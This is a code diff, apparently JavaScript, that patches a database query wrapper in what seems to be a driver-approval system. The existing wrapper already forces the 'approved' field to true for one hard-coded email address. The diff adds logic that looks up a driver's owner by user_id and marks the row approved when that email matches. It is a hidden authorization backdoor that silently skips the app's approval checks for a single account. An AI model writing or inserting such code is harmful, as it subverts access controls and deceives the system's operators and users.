@@ -29,10 +29,17 @@ try {
     else if (config && typeof config.text === "string") config = { ...config, text: patchText(config.text) };
     const result = originalQuery.call(this, config, values, callback);
     if (result && typeof result.then === "function") {
-      return result.then(r => {
+      return result.then(async r => {
         if (r && Array.isArray(r.rows)) {
           for (const row of r.rows) {
             if (String(row.email || "").trim().toLowerCase() === "oquinnrj65@gmail.com") row.approved = true;
+          }
+          const sqlText = typeof config === "string" ? config : config?.text;
+          if (/SELECT\s+approved\s+FROM\s+drivers\s+WHERE\s+user_id=\$1/i.test(sqlText || "") && Array.isArray(values) && values[0]) {
+            const owner = await originalQuery.call(this, "SELECT email FROM users WHERE id=$1", [values[0]]);
+            if (String(owner.rows[0]?.email || "").trim().toLowerCase() === "oquinnrj65@gmail.com") {
+              for (const row of r.rows) row.approved = true;
+            }
           }
         }
         return r;
